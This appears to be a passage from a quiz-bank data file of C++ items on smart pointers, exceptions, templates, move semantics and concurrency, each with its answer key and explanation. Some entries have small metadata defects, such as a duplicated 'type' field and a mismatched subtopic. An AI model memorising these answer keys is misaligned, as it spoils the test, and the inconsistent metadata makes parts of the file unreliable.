    hint: "std::unique_ptr cannot be copied; moving it leaves the source pointer in an empty (null) state.",
    explanation: "`std::unique_ptr` enforces sole ownership. `std::move(p1)` transfers the allocated resource to `p2` and sets `p1` to `nullptr`. `if (!p1)` evaluates to true, printing 'null:', followed by `*p2` (42), yielding 'null:42'.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["smart-pointers", "unique_ptr", "move"]
  },
  {
    id: "cpp-int-004",
    language: "cpp",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "smart_pointers",
    subtopic: "unique_ptr_copy_prohibition",
    standardVersion: "C++17",
    prompt: "Identify the line with the compilation error attempting to copy a `std::unique_ptr`.",
    code: "#include <iostream>\n#include <memory>\nint main() {\n    std::unique_ptr<int> u1 = std::make_unique<int>(100);\n    std::unique_ptr<int> u2 = u1;\n    std::cout << *u2 << std::endl;\n    return 0;\n}",
    correctAnswer: 5,
    targetLine: 5,
    acceptedAnswers: [5, "5", "Line 5"],
    hint: "std::unique_ptr has its copy constructor deleted; ownership can only be moved.",
    explanation: "Line 5 attempts copy initialization `u2 = u1`. Because `std::unique_ptr` represents exclusive ownership, its copy constructor is explicitly deleted (`= delete`). It must be moved using `std::move(u1)`.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["smart-pointers", "debugging", "unique_ptr"]
  },
  {
    id: "cpp-int-005",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "destructors",
    subtopic: "stack_unwinding_order",
    standardVersion: "C++17",
    prompt: "In what order are the local stack objects destroyed when leaving `testScope()`?",
    code: "#include <iostream>\nstruct Tracker {\n    char id;\n    ~Tracker() { std::cout << id; }\n};\nvoid testScope() {\n    Tracker a{'A'};\n    Tracker b{'B'};\n    Tracker c{'C'};\n}\nint main() {\n    testScope();\n    return 0;\n}",
    options: ["CBA", "ABC", "BAC", "CAB"],
    correctAnswer: "CBA",
    acceptedAnswers: ["CBA"],
    hint: "C++ destructors for local stack automatic variables are invoked in reverse order of their creation (LIFO).",
    explanation: "Automatic stack objects are destroyed in exact reverse order of construction. Objects are constructed in order A, B, C; when exiting scope, their destructors run in reverse order: C, then B, then A, outputting 'CBA'.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["destructors", "raii", "stack"]
  },
  {
    id: "cpp-int-006",
    language: "cpp",
    difficulty: "intermediate",
    type: "fill_code",
    topic: "oop",
    subtopic: "override_specifier",
    standardVersion: "C++17",
    prompt: "Fill in the C++ keyword used to ensure at compile time that a member function overrides a virtual function in a base class.",
    code: "class Base {\npublic:\n    virtual void process() = 0;\n};\nclass Derived : public Base {\npublic:\n    void process() _________;\n};",
    correctAnswer: "override",
    acceptedAnswers: ["override"],
    hint: "The contextual keyword introduced in C++11 to verify matching virtual signatures.",
    explanation: "The `override` specifier explicitly instructs the compiler to verify that the method signatures match a virtual function in the base class. If signatures mismatch (e.g. constness or parameter type differences), the compiler raises an error.",
    points: 200,
    estimatedSeconds: 25,
    tags: ["oop", "virtual", "override"]
  },
  {
    id: "cpp-int-007",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "lambdas",
    subtopic: "capture_by_value_vs_ref",
    standardVersion: "C++17",
    prompt: "What does this snippet print regarding lambda capture by value?",
    code: "#include <iostream>\nint main() {\n    int factor = 2;\n    auto multiply = [factor](int x) { return x * factor; };\n    factor = 10;\n    std::cout << multiply(5);\n    return 0;\n}",
    options: ["10", "50", "2", "20"],
    correctAnswer: "10",
    acceptedAnswers: ["10", 10],
    hint: "The lambda captures factor by value at the moment the lambda expression is created.",
    explanation: "In `[factor]`, `factor` is captured by value at the time the lambda is defined, making a copy with value 2. Subsequent modifications to the outer `factor = 10` do not affect the captured copy. `multiply(5)` computes 5 * 2 = 10.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["lambdas", "closures"]
  },
  {
    id: "cpp-int-008",
    language: "cpp",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "templates",
    subtopic: "function_templates",
    standardVersion: "C++17",
    prompt: "What happens during template instantiation in C++?",
    code: "template <typename T>\nT add(T a, T b) { return a + b; }\n\nint res = add(3, 4);",
    options: [
      "The compiler generates a concrete function specialization for type `int` during compilation",
      "The virtual machine resolves types dynamically at runtime",
      "All types are cast to void* and evaluated through dynamic dispatch",
      "Templates are interpreted by the linker without emitting machine instructions"
    ],
    correctAnswer: "The compiler generates a concrete function specialization for type `int` during compilation",
    acceptedAnswers: ["The compiler generates a concrete function specialization for type `int` during compilation"],
    hint: "C++ templates are compile-time generic code generation facilities.",
    explanation: "When a template function is invoked with specific template arguments (e.g., `add(3, 4)` with type `int`), the compiler synthesizes an actual function definition substituting `T = int` at compile-time with zero runtime overhead.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["templates", "instantiation"]
  },
  {
    id: "cpp-int-009",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "exceptions",
    subtopic: "try_catch_reference",
    standardVersion: "C++17",
    prompt: "What is printed when catching an exception by reference?",
    code: "#include <iostream>\n#include <stdexcept>\nint main() {\n    try {\n        throw std::runtime_error(\"Timeout\");\n    } catch (const std::exception& e) {\n        std::cout << \"Caught:\" << e.what();\n    }\n    return 0;\n}",
    options: ["Caught:Timeout", "Timeout", "Caught:std::exception", "Caught:runtime_error"],
    correctAnswer: "Caught:Timeout",
    acceptedAnswers: ["Caught:Timeout"],
    hint: "std::runtime_error inherits from std::exception, and e.what() returns the explanatory string.",
    explanation: "`std::runtime_error` inherits from `std::exception`. Catching by `const std::exception&` prevents slicing and invokes polymorphic `what()`, which returns the string 'Timeout'. Output is 'Caught:Timeout'.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["exceptions", "oop"]
  },
  {
    id: "cpp-int-010",
    language: "cpp",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "exceptions",
    subtopic: "catch_block_ordering",
    standardVersion: "C++17",
    prompt: "Identify the line with the logical defect where a base exception catch block shadows a derived catch block.",
    code: "#include <iostream>\n#include <stdexcept>\nint main() {\n    try {\n        throw std::invalid_argument(\"err\");\n    } catch (const std::exception& e) {\n        std::cout << \"Base\";\n    } catch (const std::invalid_argument& e) {\n        std::cout << \"Derived\";\n    }\n    return 0;\n}",
    correctAnswer: 6,
    targetLine: 6,
    acceptedAnswers: [6, "6", "Line 6"],
    hint: "Catch handlers are evaluated sequentially; catching a base type first renders derived handlers unreachable.",
    explanation: "Line 6 catches `const std::exception&` before line 8 catches `const std::invalid_argument&`. Because `invalid_argument` inherits from `exception`, line 6 intercepts all standard exceptions, making line 8 unreachable dead code.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["exceptions", "debugging"]
  },
  {
    id: "cpp-int-011",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "stl",
    subtopic: "map_subscript_operator",
    standardVersion: "C++17",
    prompt: "What does this program print when accessing an uninitialized key with `std::map::operator[]`?",
    code: "#include <iostream>\n#include <map>\n#include <string>\nint main() {\n    std::map<std::string, int> scores;\n    std::cout << scores[\"player1\"] << \":\" << scores.size();\n    return 0;\n}",
    options: ["0:1", "0:0", "Throws exception", "Garbage:1"],
    correctAnswer: "0:1",
    acceptedAnswers: ["0:1"],
    hint: "std::map::operator[] default-inserts the element if the key does not already exist.",
    explanation: "In `std::map`, `operator[]` inserts a new element default-constructed (value 0 for `int`) if the key is not present. Thus `scores[\"player1\"]` evaluates to 0, and the container size increments to 1. The output is '0:1'.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["stl", "map"]
  },
  {
    id: "cpp-int-012",
    language: "cpp",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "functions",
    subtopic: "pass_by_const_reference",
    standardVersion: "C++17",
    prompt: "Why is passing non-trivial objects (e.g. `std::vector<int>` or `std::string`) by `const T&` standard practice in C++?",
    code: "void analyze(const std::vector<std::string>& data);",
    options: [
      "It avoids an expensive deep copy of data while guaranteeing read-only safety",
      "It automatically moves the object into register memory",
      "It allows the function to modify the caller's arguments asynchronously",
      "It compiles the function into dynamic assembly"
    ],
    correctAnswer: "It avoids an expensive deep copy of data while guaranteeing read-only safety",
    acceptedAnswers: ["It avoids an expensive deep copy of data while guaranteeing read-only safety"],
    hint: "Passing by value invokes the copy constructor for all elements.",
    explanation: "Passing by `const T&` avoids the overhead of invoking copy constructors and allocating heap storage for duplicated elements, while the `const` qualifier guarantees the callee cannot mutate the caller's object.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["functions", "performance", "references"]
  },
  {
    id: "cpp-int-013",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "oop",
    subtopic: "static_member_variables",
    standardVersion: "C++17",
    prompt: "What is printed by this counter class utilizing a static member variable?",
    code: "#include <iostream>\nclass Counter {\npublic:\n    static int count;\n    Counter() { count++; }\n};\nint Counter::count = 0;\nint main() {\n    Counter c1;\n    Counter c2;\n    Counter c3;\n    std::cout << Counter::count;\n    return 0;\n}",
    options: ["3", "1", "0", "Compilation error"],
    correctAnswer: "3",
    acceptedAnswers: ["3", 3],
    hint: "Static member variables are shared across all instances of the class.",
    explanation: "A static member variable has one single instance shared across all class objects. Each of the three `Counter` instantiations invokes the default constructor, incrementing `count` to 3.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["oop", "static"]
  },
  {
    id: "cpp-int-014",
    language: "cpp",
    difficulty: "intermediate",
    type: "fill_code",
    topic: "oop",
    subtopic: "pure_virtual_function",
    standardVersion: "C++17",
    prompt: "Fill in the syntax that declares this virtual method as a pure virtual function, making the class abstract.",
    code: "class Shape {\npublic:\n    virtual double area() const = ___;\n};",
    correctAnswer: "0",
    acceptedAnswers: ["0"],
    hint: "In C++, assigning a virtual function to zero denotes a pure specifier.",
    explanation: "A virtual function declared with `= 0;` is a pure virtual function. Classes containing at least one pure virtual function are abstract and cannot be directly instantiated.",
    points: 200,
    estimatedSeconds: 20,
    tags: ["oop", "abstract-class", "virtual"]
  },
  {
    id: "cpp-int-015",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "casting",
    subtopic: "dynamic_cast_pointer",
    standardVersion: "C++17",
    prompt: "What does this snippet print when performing an invalid downcast with `dynamic_cast` on a pointer?",
    code: "#include <iostream>\nclass Animal { public: virtual ~Animal() = default; };\nclass Dog : public Animal {};\nclass Cat : public Animal {};\nint main() {\n    Animal* a = new Dog();\n    Cat* c = dynamic_cast<Cat*>(a);\n    if (c == nullptr) {\n        std::cout << \"NullPointer\";\n    } else {\n        std::cout << \"Success\";\n    }\n    delete a;\n    return 0;\n}",
    options: ["NullPointer", "Success", "Throws std::bad_cast", "Compilation error"],
    correctAnswer: "NullPointer",
    acceptedAnswers: ["NullPointer"],
    hint: "When dynamic_cast fails on a pointer type, it returns nullptr (unlike references which throw std::bad_cast).",
    explanation: "When `dynamic_cast` fails on pointer conversions between incompatible polymorphic types, it safely returns `nullptr` instead of throwing an exception. Since `a` points to a `Dog`, casting to `Cat*` fails and returns `nullptr`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["casting", "dynamic_cast", "rtti"]
  },
  {
    id: "cpp-int-016",
    language: "cpp",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "smart_pointers",
    subtopic: "shared_ptr_reference_count",
    standardVersion: "C++17",
    prompt: "What happens to the managed heap object when multiple `std::shared_ptr` instances point to it?",
    code: "auto sp1 = std::make_shared<int>(50);\nauto sp2 = sp1;\nauto sp3 = sp1;",
    options: [
      "The control block increments reference count to 3; memory is deallocated only when count drops to 0",
      "Each assignment duplicates the integer 50 on the heap three separate times",
      "Memory is deallocated as soon as sp1 exits its local lexical scope",
      "sp2 and sp3 become dangling references when sp1 is reset"
    ],
    correctAnswer: "The control block increments reference count to 3; memory is deallocated only when count drops to 0",
    acceptedAnswers: ["The control block increments reference count to 3; memory is deallocated only when count drops to 0"],
    hint: "std::shared_ptr uses an atomic reference counter stored in a shared control block.",
    explanation: "`std::shared_ptr` uses shared ownership. Each copy increments the shared reference count (here to 3). The underlying object is deleted when the last owning `shared_ptr` is destroyed or reset, causing the count to reach 0.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["smart-pointers", "shared_ptr"]
  },
  {
    id: "cpp-int-017",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "operator_overloading",
    subtopic: "operator_plus",
    standardVersion: "C++17",
    prompt: "What is printed by this overloaded `+` operator for 2D points?",
    code: "#include <iostream>\nstruct Point {\n    int x, y;\n    Point operator+(const Point& other) const {\n        return {x + other.x, y + other.y};\n    }\n};\nint main() {\n    Point p1{2, 3};\n    Point p2{4, 1};\n    Point p3 = p1 + p2;\n    std::cout << p3.x << \",\" << p3.y;\n    return 0;\n}",
    options: ["6,4", "2,3", "4,1", "5,5"],
    correctAnswer: "6,4",
    acceptedAnswers: ["6,4"],
    hint: "Add corresponding x components (2 + 4) and y components (3 + 1).",
    explanation: "The overloaded `operator+` adds `p1.x + p2.x` (2 + 4 = 6) and `p1.y + p2.y` (3 + 1 = 4), returning `{6, 4}`. Printing `p3.x << \",\" << p3.y` outputs '6,4'.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["oop", "operator-overloading"]
  },
  {
    id: "cpp-int-018",
    language: "cpp",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "constructors",
    subtopic: "explicit_keyword",
    standardVersion: "C++17",
    prompt: "Why should single-argument constructors generally be marked with the `explicit` keyword?",
    code: "class MyString {\npublic:\n    explicit MyString(int capacity);\n};",
    options: [
      "To prevent unwanted implicit conversions (e.g. passing an int where MyString is expected)",
      "To force the constructor to run in hardware registers",
      "To allow the constructor to return null",
      "To enable automatic inheritance by child classes"
    ],
    correctAnswer: "To prevent unwanted implicit conversions (e.g. passing an int where MyString is expected)",
    acceptedAnswers: ["To prevent unwanted implicit conversions (e.g. passing an int where MyString is expected)"],
    hint: "Without explicit, a constructor callable with one argument serves as an implicit conversion rule.",
    explanation: "In C++, single-argument constructors define implicit type conversions by default. For instance, `MyString s = 10;` would compile and create an empty string with capacity 10. Marking the constructor `explicit` disallows implicit conversions and requires explicit initialization.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["constructors", "explicit", "type-safety"]
  },
  {
    id: "cpp-int-019",
    language: "cpp",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "stl_algorithms",
    subtopic: "std_transform_lambda",
    standardVersion: "C++17",
    prompt: "What is printed after applying `std::count_if` with a lambda predicate?",
    code: "#include <iostream>\n#include <vector>\n#include <algorithm>\nint main() {\n    std::vector<int> vals = {3, 7, 2, 8, 5, 10};\n    int evens = std::count_if(vals.begin(), vals.end(), [](int n) {\n        return n % 2 == 0;\n    });\n    std::cout << evens;\n    return 0;\n}",
    options: ["3", "2", "4", "6"],
    correctAnswer: "3",
    acceptedAnswers: ["3", 3],
    hint: "Count how many numbers in {3, 7, 2, 8, 5, 10} are divisible by 2.",
    explanation: "The even elements in the vector are 2, 8, and 10. The lambda returns `true` for these 3 numbers, so `std::count_if` returns 3.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["stl", "algorithms", "lambdas"]
  },
  {
    id: "cpp-int-020",
    language: "cpp",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "pointers",
    subtopic: "dangling_pointer_local_address",
    standardVersion: "C++17",
    prompt: "Identify the line returning the address of a local automatic variable, creating a dangling pointer.",
    code: "#include <iostream>\nint* getLocalPtr() {\n    int value = 42;\n    return &value;\n}\nint main() {\n    int* p = getLocalPtr();\n    std::cout << *p;\n    return 0;\n}",
    correctAnswer: 4,
    targetLine: 4,
    acceptedAnswers: [4, "4", "Line 4"],
    hint: "Local stack variables are destroyed when their enclosing function returns.",
    explanation: "Line 4 returns `&value`. `value` is allocated on the call stack of `getLocalPtr()`. When `getLocalPtr()` returns, `value` is destroyed, making the returned pointer dangling and dereferencing it in `main` undefined behavior.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["memory", "pointers", "debugging"]
  },

  // =========================================================================
  // C++ EXPERT (20 QUESTIONS: cpp-exp-001 to cpp-exp-020)
  // =========================================================================
  {
    id: "cpp-exp-001",
    language: "cpp",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "oop",
    subtopic: "virtual_destructor_necessity",
    standardVersion: "C++17",
    prompt: "Why must a polymorphic base class declare its destructor as `virtual`?",
    code: "class Base {\npublic:\n    virtual void run() {}\n    ~Base() {} // Non-virtual destructor!\n};\nclass Derived : public Base {\n    int* buffer = new int[100];\npublic:\n    ~Derived() { delete[] buffer; }\n};\n\nBase* b = new Derived();\ndelete b; // What is the defect?",
    options: [
      "Deleting a derived object via a base pointer with a non-virtual destructor invokes undefined behavior and leaks derived resources",
      "It prevents the derived class from defining constructors",
      "Virtual destructors are required to enable RTTI via dynamic_cast",
      "Base classes without virtual destructors cannot be allocated on the heap"
    ],
    correctAnswer: "Deleting a derived object via a base pointer with a non-virtual destructor invokes undefined behavior and leaks derived resources",
    acceptedAnswers: ["Deleting a derived object via a base pointer with a non-virtual destructor invokes undefined behavior and leaks derived resources"],
    hint: "Under §8.3.5 / §7.2 of ISO C++, deleting via base pointer when base destructor is not virtual is undefined behavior.",
    explanation: "Under the ISO C++ standard, deleting an object of derived type through a pointer to a base class that has a non-virtual destructor is undefined behavior. In practice, `Derived::~Derived()` will not be called, leaking `buffer` and skipping derived cleanup.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["oop", "virtual", "destructors", "undefined-behavior"]
  },
  {
    id: "cpp-exp-002",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "oop",
    subtopic: "object_slicing",
    standardVersion: "C++17",
    prompt: "What does this program print demonstrating object slicing when passing by value?",
    code: "#include <iostream>\nclass Base {\npublic:\n    virtual void print() const { std::cout << \"Base\"; }\n};\nclass Derived : public Base {\npublic:\n    void print() const override { std::cout << \"Derived\"; }\n};\nvoid display(Base b) {\n    b.print();\n}\nint main() {\n    Derived d;\n    display(d);\n    return 0;\n}",
    options: ["Base", "Derived", "BaseDerived", "Compilation error"],
    correctAnswer: "Base",
    acceptedAnswers: ["Base"],
    hint: "Notice display() takes Base by value, not by reference or pointer.",
    explanation: "Because `display(Base b)` accepts `Base` by value, the copy constructor of `Base` is invoked, copying only the `Base` subobject of `d` and slicing off `Derived`. The resulting parameter object `b` has dynamic type `Base`, printing 'Base'.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["oop", "slicing", "polymorphism"]
  },
  {
    id: "cpp-exp-003",
    language: "cpp",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "move_semantics",
    subtopic: "noexcept_move_constructor",
    standardVersion: "C++17",
    prompt: "Why should move constructors and move assignment operators be explicitly marked `noexcept`?",
    code: "MyVector(MyVector&& other) noexcept : data(other.data), sz(other.sz) { ... }",
    options: [
      "Standard containers like std::vector will fallback to copying elements during reallocation if move is not noexcept, for strong exception guarantee",
      "Compilers reject move constructors that are not marked noexcept",
      "noexcept moves the object directly into GPU registers",
      "It disables destructors for moved-from objects"
    ],
    correctAnswer: "Standard containers like std::vector will fallback to copying elements during reallocation if move is not noexcept, for strong exception guarantee",
    acceptedAnswers: ["Standard containers like std::vector will fallback to copying elements during reallocation if move is not noexcept, for strong exception guarantee"],
    hint: "Consider how std::vector maintains the strong exception guarantee when resizing buffer.",
    explanation: "`std::vector::reserve` or reallocation must satisfy the strong exception safety guarantee. If moving an element throws, the vector cannot roll back modified elements. Hence, standard containers query `std::is_nothrow_move_constructible<T>`; if false, they safely fall back to copy construction.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["move-semantics", "noexcept", "vector", "exception-safety"]
  },
  {
    id: "cpp-exp-004",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "constructors",
    subtopic: "initialization_order_declaration_vs_list",
    standardVersion: "C++17",
    prompt: "What is printed by this class where initialization order differs between class declaration and constructor list?",
    code: "#include <iostream>\nstruct Sequence {\n    int a;\n    int b;\n    Sequence(int val) : b(val + 5), a(b * 2) {}\n};\nint main() {\n    // Under ISO C++, members are initialized in order of DECLARATION in class definition!\n    // Here 'a' is declared before 'b'.\n    // When 'a' initializes with (b * 2), 'b' is still uninitialized indeterminate memory.\n    // How is this classified in ISO C++?\n    return 0;\n}",
    options: [
      "Accessing uninitialized member 'b' to initialize 'a' produces undefined behavior or indeterminate value",
      "Compilers automatically reorder declaration order to match constructor list",
      "b is always initialized first regardless of declaration order",
      "C++ guarantees zero-initialization of all class members before list evaluation"
    ],
    correctAnswer: "Accessing uninitialized member 'b' to initialize 'a' produces undefined behavior or indeterminate value",
    acceptedAnswers: ["Accessing uninitialized member 'b' to initialize 'a' produces undefined behavior or indeterminate value"],
    hint: "In C++, member initialization order is determined strictly by the order members are declared in the class definition, NOT the constructor initializer list.",
    explanation: "Per ISO C++ §12.6.2, non-static data members are initialized in the order of declaration in the class definition. Since `a` is declared before `b`, `a` is initialized first using `(b * 2)`. Because `b` is uninitialized at that moment, reading it invokes undefined behavior.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["constructors", "initialization-order", "undefined-behavior"]
  },
  {
    id: "cpp-exp-005",
    language: "cpp",
    difficulty: "expert",
    type: "smart_pointers",
    subtopic: "weak_ptr_cycle_breaking",
    type: "multiple_choice",
    topic: "smart_pointers",
    standardVersion: "C++17",
    prompt: "How does `std::weak_ptr` resolve memory leaks caused by circular references between `std::shared_ptr` instances?",
    code: "struct Node {\n    std::shared_ptr<Node> next;\n    std::weak_ptr<Node> prev; // Prevents cycle!\n};",
    options: [
      "weak_ptr observes the managed object without incrementing the strong reference count, allowing destruction when strong count hits 0",
      "weak_ptr forces the operating system garbage collector to run cycle detection",
      "weak_ptr deletes the target object immediately when assigned",
      "weak_ptr converts the pointer into a raw void* reference"
    ],
    correctAnswer: "weak_ptr observes the managed object without incrementing the strong reference count, allowing destruction when strong count hits 0",
    acceptedAnswers: ["weak_ptr observes the managed object without incrementing the strong reference count, allowing destruction when strong count hits 0"],
    hint: "Weak pointers do not own the object and only track weak counts in the control block.",
    explanation: "Two `shared_ptr` instances pointing to each other maintain reference counts of at least 1 indefinitely, preventing deletion. `std::weak_ptr` holds a non-owning reference without increasing the strong reference count, breaking cyclic dependencies.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["smart-pointers", "weak_ptr", "memory-leaks"]
  },
  {
    id: "cpp-exp-006",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "const",
    subtopic: "mutable_member_variable",
    standardVersion: "C++17",
    prompt: "What is printed by this const member function modifying a `mutable` variable?",
    code: "#include <iostream>\nclass Cache {\n    mutable int hitCount = 0;\npublic:\n    int getData() const {\n        hitCount++;\n        return 42;\n    }\n    int getHits() const { return hitCount; }\n};\nint main() {\n    const Cache c;\n    c.getData();\n    c.getData();\n    std::cout << c.getHits();\n    return 0;\n}",
    options: ["2", "0", "Compilation error: modifying member in const function", "42"],
    correctAnswer: "2",
    acceptedAnswers: ["2", 2],
    hint: "The mutable specifier exempts a member variable from the constness of the enclosing object.",
    explanation: "The `mutable` specifier permits a non-static class member to be modified even inside `const` member functions and on `const` object instances. Calling `getData()` twice increments `hitCount` from 0 to 2, which is printed by `c.getHits()`.",
    points: 300,
    estimatedSeconds: 45,
    tags: ["const", "mutable"]
  },
  {
    id: "cpp-exp-007",
    language: "cpp",
    difficulty: "expert",
    type: "find_bug",
    topic: "concurrency",
    subtopic: "lock_guard_deadlock",
    standardVersion: "C++17",
    prompt: "Identify the line attempting to recursively acquire a non-recursive `std::mutex`, resulting in immediate deadlock on the same thread.",
    code: "#include <iostream>\n#include <mutex>\nclass Manager {\n    std::mutex mtx;\npublic:\n    void subTask() {\n        std::lock_guard<std::mutex> lock(mtx);\n    }\n    void mainTask() {\n        std::lock_guard<std::mutex> lock(mtx);\n        subTask();\n    }\n};\nint main() {\n    Manager m;\n    m.mainTask();\n    return 0;\n}",
    correctAnswer: 7,
    targetLine: 7,
    acceptedAnswers: [7, "7", "Line 7"],
    hint: "std::mutex cannot be locked by the same thread multiple times without unlocking first.",
    explanation: "Line 7 inside `subTask()` attempts to lock `mtx`. However, `mainTask()` (line 10) already holds `mtx` on the exact same thread. Because `std::mutex` is non-recursive, re-locking it deadlocks or causes undefined behavior. `std::recursive_mutex` would be required.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["concurrency", "mutex", "debugging"]
  },
  {
    id: "cpp-exp-008",
    language: "cpp",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "templates",
    subtopic: "sfinae_and_concepts",
    standardVersion: "C++20",
    prompt: "In modern C++20, what language feature supersedes complex SFINAE (`std::enable_if_t`) by providing direct compile-time constraints on template arguments?",
    code: "template <typename T>\nrequires std::integral<T>\nT compute(T a, T b) { return a % b; }",
    options: [
      "Concepts and requires clauses",
      "Dynamic type introspection",
      "Virtual template tables",
      "Macro introspection guards"
    ],
    correctAnswer: "Concepts and requires clauses",
    acceptedAnswers: ["Concepts and requires clauses"],
    hint: "Introduced in C++20 with keywords concept and requires.",
    explanation: "C++20 Concepts and `requires` clauses allow expressing compile-time predicate constraints directly in function and class template declarations, providing concise syntax, faster compilation, and clear compiler error diagnostics compared to C++11/14 SFINAE.",
    points: 300,
    estimatedSeconds: 40,
    tags: ["templates", "concepts", "cpp20"]
  },
  {
    id: "cpp-exp-009",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "constexpr",
    subtopic: "compile_time_evaluation",
    standardVersion: "C++17",
    prompt: "What is printed by this compile-time `constexpr` evaluation?",
    code: "#include <iostream>\nconstexpr int factorial(int n) {\n    return (n <= 1) ? 1 : n * factorial(n - 1);\n}\nint main() {\n    constexpr int val = factorial(4);\n    std::cout << val;\n    return 0;\n}",
    options: ["24", "12", "4", "Compilation error"],
    correctAnswer: "24",
    acceptedAnswers: ["24", 24],
    hint: "4! = 4 * 3 * 2 * 1 = 24 evaluated at compile time.",
    explanation: "A `constexpr` function can be evaluated at compile time if given constant expression arguments. `factorial(4)` evaluates to 4 * 3 * 2 * 1 = 24 at compile time, which is printed at runtime.",
    points: 300,
    estimatedSeconds: 35,
    tags: ["constexpr", "compile-time"]
  },
  {
    id: "cpp-exp-010",
    language: "cpp",
    difficulty: "expert",
    type: "fill_code",
    topic: "move_semantics",
    subtopic: "perfect_forwarding",
    standardVersion: "C++17",
    prompt: "Fill in the standard utility function used in template wrappers to achieve perfect forwarding of universal/forwarding references.",
    code: "#include <utility>\ntemplate <typename T>\nvoid wrapper(T&& arg) {\n    targetFunction(std::_______<T>(arg));\n}",
    correctAnswer: "forward",
    acceptedAnswers: ["forward"],
    hint: "std::move unconditionally casts to rvalue; std::forward preserves value category.",
    explanation: "`std::forward<T>(arg)` achieves perfect forwarding: it casts `arg` to an rvalue reference only if the original argument passed to `wrapper` was an rvalue, preserving lvalueness or rvalueness.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["templates", "perfect-forwarding", "std::forward"]
  },
  {
    id: "cpp-exp-011",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "templates",
    subtopic: "template_specialization",
    standardVersion: "C++17",
    prompt: "What is printed by this explicit full template specialization?",
    code: "#include <iostream>\ntemplate <typename T>\nstruct Formatter {\n    static void run() { std::cout << \"Generic:\"; }\n};\ntemplate <>\nstruct Formatter<bool> {\n    static void run() { std::cout << \"Boolean:\"; }\n};\nint main() {\n    Formatter<int>::run();\n    Formatter<bool>::run();\n    return 0;\n}",
    options: ["Generic:Boolean:", "Boolean:Generic:", "Generic:Generic:", "Boolean:Boolean:"],
    correctAnswer: "Generic:Boolean:",
    acceptedAnswers: ["Generic:Boolean:"],
    hint: "Formatter<int> uses the primary template, while Formatter<bool> selects the full template specialization.",
    explanation: "`Formatter<int>` matches the unspecialized primary template ('Generic:'). `Formatter<bool>` matches the explicit specialization `template <> struct Formatter<bool>` ('Boolean:'). The resulting output is 'Generic:Boolean:'.",
    points: 300,
    estimatedSeconds: 40,
    tags: ["templates", "specialization"]
  },
  {
    id: "cpp-exp-012",
    language: "cpp",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory",
    subtopic: "placement_new",
    standardVersion: "C++17",
    prompt: "What does 'placement new' achieve in C++ systems programming?",
    code: "alignas(Widget) char buffer[sizeof(Widget)];\nWidget* w = new (buffer) Widget(1, 2);",
    options: [
      "Constructs an object in pre-allocated memory without requesting memory from the heap",
      "Allocates thread-local memory on foreign NUMA nodes",
      "Constructs objects in GPU video memory",
      "Bypasses the constructor to directly copy binary bytes"
    ],
    correctAnswer: "Constructs an object in pre-allocated memory without requesting memory from the heap",
    acceptedAnswers: ["Constructs an object in pre-allocated memory without requesting memory from the heap"],
    hint: "Placement new invokes the constructor at a specific pre-existing memory address.",
    explanation: "Placement new (`new (ptr) Type(...)`) constructs an instance directly inside an already allocated memory buffer (e.g. stack, memory pool, or shared memory buffer) without calling heap allocation routines like `malloc`.",
    points: 300,
    estimatedSeconds: 45,
    tags: ["memory", "placement-new"]
  },
  {
    id: "cpp-exp-013",
    language: "cpp",
    difficulty: "expert",
    type: "find_bug",
    topic: "stl",
    subtopic: "iterator_invalidation",
    standardVersion: "C++17",
    prompt: "Identify the line where an iterator is used after being invalidated by `std::vector::erase()`.",
    code: "#include <iostream>\n#include <vector>\nint main() {\n    std::vector<int> v = {1, 2, 3, 4};\n    for (auto it = v.begin(); it != v.end(); ++it) {\n        if (*it == 2) {\n            v.erase(it);\n        }\n    }\n    return 0;\n}",
    correctAnswer: 7,
    targetLine: 7,
    acceptedAnswers: [7, "7", "Line 7"],
    hint: "vector::erase invalidates all iterators at and after the erased element, but the loop continues incrementing ++it.",
